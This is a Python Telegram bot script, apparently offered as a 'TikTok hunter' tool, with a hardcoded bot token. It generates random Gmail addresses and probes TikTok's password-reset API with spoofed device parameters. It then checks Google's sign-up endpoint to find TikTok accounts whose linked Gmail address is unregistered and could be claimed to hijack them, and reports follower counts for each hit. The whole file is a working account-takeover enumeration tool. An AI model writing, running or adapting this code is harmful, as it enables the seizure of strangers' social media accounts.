import datetime
import random
import threading
import requests,telebot
from telebot import types
import re
from re import findall
token= '6077689786:AAFgn5M-e3T7iwPOp2gVS6Eo2lvkcmFIDGQ'     #توكنك
bot = telebot.TeleBot(token)
startt = types.InlineKeyboardButton(text='𝚂𝚃𝙰𝚁𝚃 𝚃𝙷𝙴 𝚂𝙲𝙰𝙽 𖣾 ',callback_data='start')
co = types.InlineKeyboardButton(text='نضم بقناتي 𖣐 ',url='t.me/llxxx3')
coder = requests.session()
@bot.message_handler(commands=['start'])
def start(message):
 key = types.InlineKeyboardMarkup()
 key.add(startt)
 key.add(co)
 bot.send_message(message.chat.id,'Welcome To Bot Hunter TikTok  \n By @PY_87 (kakawi)',reply_markup=key)
@bot.callback_query_handler(func=lambda m:True)
def qw(call):
    if call.data == "start":
        
        gen(call.message)
def gen(message):
    global i

    for i in range(100000):
        num = "qwertyuiopasdfghjklzxcvbnm091"
        gan = str(''.join(random.choice(num)for i in range(10)))
        email = gan+"@gmail.com"
        check(message,email)
def check(message,email):
    faliure = 0
    true = 0
    url = f"https://api2-16-h2.musical.ly/aweme/v1/passport/find-password-via-email/?app_language=en&manifest_version_code=2018101933&_rticket=1640498724713&iid=7045258653545678597&channel=googleplay&language=en&fp=&device_type=JKM-LX1&resolution=1080*2137&openudid=12c019d2ff003ae0&update_version_code=2018101933&sys_region=US&os_api=28&is_my_cn=0&timezone_name=Asia%2FBaghdad&dpi=408&carrier_region=IQ&ac=3g&device_id=6842870495047812614&mcc_mnc=41805&timezone_offset=10800&os_version=9&version_code=880&carrier_region_v2=418&app_name=musical_ly&ab_version=8.8.0&version_name=8.8.0&device_brand=HUAWEI&ssmix=a&pass-region=1&build_number=8.8.0&device_platform=android&region=US&aid=1233&ts=1640498723&as=a1f6304c330281f6084477&cp=0e28166a3f85cd68e1OeWi&mas=011642394e9220eefdfcb08b2bbe4539f5ecec2c2c1c0c6c668c1c"
    data = f"app_language=en&manifest_version_code=2018101933&_rticket=1640498724713&iid=7045258653545678597&channel=googleplay&language=en&fp=&device_type=JKM-LX1&resolution=1080*2137&openudid=12c019d2ff003ae0&update_version_code=2018101933&sys_region=US&os_api=28&is_my_cn=0&timezone_name=Asia%2FBaghdad&dpi=408&email={email}&retry_type=no_retry&carrier_region=IQ&ac=3g&device_id=6842870495047812614&mcc_mnc=41805&timezone_offset=10800&os_version=9&version_code=880&carrier_region_v2=418&app_name=musical_ly&ab_version=8.8.0&version_name=8.8.0&device_brand=HUAWEI&ssmix=a&pass-region=1&build_number=8.8.0&device_platform=android&region=US&aid=1233"
    az = (requests.post(url, data=data).text)

    if  "Sent successfully" in az:

        h = {
            'Content-Length': '98',
            'Content-Type': 'text/plain; charset=UTF-8',
            'Host': 'android.clients.google.com',
            'Connection': 'Keep-Alive',
            'user-agent': 'GoogleLoginService/1.3(m0 JSS15J)', }
        d = {
            'username': f"{email}",
            'version': '3',
            'firstName': 'Dev',
            'lastName': 'Sarot'}
        res = requests.post('https://android.clients.google.com/setup/checkavail', json=d, headers=h).text

        if "SUCCESS" in res:
            try:
                em = email.split("@gmail.com")[0]
                tt = requests.get(f"https://mr-abood.herokuapp.com/TikTok/Info?username={em}").json()
                follower_count = tt['follower_count']
                following_count = tt['following_count']
                true+=1
                kk = f"""
New Hunt TikTok!
••••••••••••••••••••••••••••••••••••••••••• 
❖ - 𝖓𝖆𝖒𝖊 :  = {em}
❖️ - 𝖊𝖒𝖆𝖎𝖑 : {email} 
❖️ - 𝖋𝖔𝖑𝖑𝖔𝖜𝖊𝖗𝖘 : {follower_count}
❖ - 𝖋𝖔𝖑𝖑𝖔𝖎𝖓𝖌 : {following_count}
❖ - 𝖛𝖎𝖔 : {datetime.datetime.now()}
••••••••••••••••••••••••••••••••••••••••••• 
 - Y :- @H0773
                """
                bot.send_message(message.chat.id,f"<strong>{kk}</strong>",parse_mode="html")
                print(
                    f'Email : {email} | Followers : {follower_count} | Following : {following_count} | Username : {em}')
                    
            except:
                pass
    else:
        key2 = types.InlineKeyboardMarkup()
        key2.row_width = 1
        btn2 = types.InlineKeyboardButton(text="- Dev",url="t.me/@H0773")
        key2.add(btn2)
        faliure +=1
        k = f"""
𝚂𝚃𝙰𝚁𝚃 𝚃𝙷𝙴 𝚂𝙲𝙰𝙽 𖣾

••••••••••••••••••••••••••••••••••••••••••• 

Email  : {email}
𝐂𝐇𝐄𝐂𝐊𝐄𝐃 𖢣 : {i}

••••••••••••••••••••••••••••••••••••••••••• 
PY : @H0773
        """
        bot.edit_message_text(chat_id=message.chat.id,message_id=message.message_id,text=f"<strong>{k}</strong>",parse_mode="html")
bot.infinity_polling()